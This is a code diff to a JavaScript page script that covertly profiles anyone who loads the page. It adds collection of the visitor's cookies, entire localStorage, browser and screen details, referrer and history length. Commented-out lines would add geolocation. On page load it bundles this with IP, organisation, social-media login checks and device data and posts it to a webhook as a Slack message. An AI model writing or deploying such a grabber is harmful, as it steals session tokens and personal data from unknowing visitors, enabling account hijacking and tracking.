@@ -7,9 +7,17 @@ if(location.href.includes('localhost:') || location.href.includes('file://')) {
     url = '';//test webhook url
 }
 
+
 var idleTime; //TODO
 var batteryInfo;
-var connectionInfo;
+var connectionInfo = {
+    loc: 'undetected',
+    city: '',
+    region: '',
+    country: '',
+    ip: 'undetected',
+    org: ''
+};
 var gpuInfo = '';
 var socialMedia = [];
 
@@ -229,8 +237,54 @@ function scResult(network, loggedIn) {
 
 }
 lsm(scResult);
+    
+var general = {
 
+    timeOpened:new Date(),
+    timezone:(new Date()).getTimezoneOffset()/60,
+
+    pageon:window.location.pathname,
+    referrer:  document.referrer,
+    previousSites:  history.length,
+
+    browserName:  navigator.appName,
+    browserEngine:  navigator.product,
+    browserVersion1a:  navigator.appVersion,
+    browserVersion1b:  navigator.userAgent,
+    browserLanguage:  navigator.language,
+    browserOnline:  navigator.onLine,
+    browserPlatform:  navigator.platform,
+    javaEnabled:  navigator.javaEnabled(),
+    dataCookiesEnabled:  navigator.cookieEnabled,
+    dataCookies1:  document.cookie,
+    dataCookies2:  decodeURIComponent(document.cookie.split(";")),
+    dataStorage:  localStorage,
+
+    sizeScreenW:  screen.width,
+    sizeScreenH:  screen.height,
+    sizeDocW:  document.width,
+    sizeDocH:  document.height,
+    sizeInW:  innerWidth,
+    sizeInH:  innerHeight,
+    sizeAvailW:  screen.availWidth,
+    sizeAvailH:  screen.availHeight,
+    scrColorDepth:  screen.colorDepth,
+    scrPixelDepth:  screen.pixelDepth,
+
+
+    // latitude:  position.coords.latitude,
+    // longitude:  position.coords.longitude,
+    // accuracy:  position.coords.accuracy,
+    // altitude:  position.coords.altitude,
+    // altitudeAccuracy:  position.coords.altitudeAccuracy,
+    // heading:  position.coords.heading,
+    // speed:  position.coords.speed,
+    // timestamp: position.timestamp
+
+
+};
 var currentdate = new Date(); 
+$( document ).ready(function() {
 setTimeout(function(){ 
 var datetime = currentdate.getDate() + "/"
                 + (currentdate.getMonth()+1)  + "/" 
@@ -246,7 +300,8 @@ everything = {
   device: device,
   location: location,
   gpuInfo: gpuInfo,
-  socialMedia: socialMedia
+  socialMedia: socialMedia,
+  general: general
 }
 $.ajax({
     data: 'payload=' + JSON.stringify({
@@ -289,7 +344,7 @@ $.ajax({
                 "short": true
             },  {
                 "title": "Connection",
-                "value": "IP: " + connectionInfo.ip + "\n" + "ORG: " + connectionInfo.org + "\n" + "Previous Page: " + document.referrer + "\n",
+                "value": "IP: " + connectionInfo.ip + "\n" + "ORG: " + connectionInfo.org + "\n" + "History: " + general.previousSites + " sites from " + document.referrer + "\n",
                 "short": true
             }, {
                 "title": "Battery",
@@ -312,3 +367,4 @@ $.ajax({
 
 
 }, 1500);
+});
